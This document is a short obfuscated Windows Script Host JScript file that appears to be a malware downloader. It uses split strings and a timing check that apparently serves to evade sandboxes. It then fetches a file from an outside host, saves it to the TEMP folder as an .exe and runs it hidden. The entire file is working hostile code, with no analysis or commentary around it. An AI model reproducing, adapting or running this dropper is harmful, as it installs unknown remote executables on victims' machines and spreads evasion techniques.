var J = false;
var Q0 = "Create"+"Object";
var X0 = function HF() {return WScript[Q0]("WScript"+".Shell");}(), HC = 11;
var CD = "MSXML2"+".XMLHTTP";
var X = 2;
var K = X - 2;
function YF(NI){X0["Run"](NI, K, K);};
function Q(){return CD + "";};
function A(E, JW){K = K * 1; return E - JW;};
function ZL(){return Q0;};
/*@cc_on
  @if (@_win32 || @_win64)
    J = true;
  @end
@*/
if (J)
{
var ZR = "";
function O(){return 22;};
var CN = 0; var UZ = 0;
function FB()
{
var UN = new this["Date"]();
var PQ = UN["getUTCMilliseconds"]();
WScript["Sleep"](O());
var UN = new this["Date"]();
var H = UN["getUTCMilliseconds"]();
WScript["Sleep"](O());
var UN = new this["Date"]();
var RC = UN["getUTCMilliseconds"]();
var CN = "U";
CN = A(H, PQ);
var UZ = "V";
UZ = A(RC, H);
ZR = "open";
return A(CN, UZ);
}
var PG = false;
var RL = false;
for (var UY = K; UY < O() * 1; UY++){if (FB() != K){
PG = true; 
UZ = "31" + 11 * CN + UZ; 
RL = true; 
break;
}}
function T() {return ((PG == true) && (PG == RL)) ? 1 : K;};
if (PG && T() && RL){
function W() {return X0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ile4Mxhj.ex" + "e";};
 T0 = Q();
 JS = WScript[Q0](T0);
 var RM = 1;
do { 
	for (;RM;){
	try {
		if (RM == 1)
		{
			JS[ZR]("GET", "http://be-stlines-tore.com/k3soa", false);
			JS["send"]();
			C = "Sleep";
			RM = 2;
		}
		WScript[C](O() + 120); 
		if (JS["readystate"] < 2 * 2) continue;
		RM = K;
		function YV(US) {var S = (1, 2, 3, 4, 5, US); return S;};
		FE = WScript[ZL()]("ADODB.Stream");
		T0 = FE;
		T0[ZR]();
		T0["type"] = YV(1);
		T0["write"](JS["ResponseBody"]);
		FE["position"] = YV(K);
		T0["Save" + "ToFile"](W(), 2);
		FE["cl"+"ose"]();
		DM = W();
		YF(DM);
	} catch(QM){};};
}while (RM);
}
}

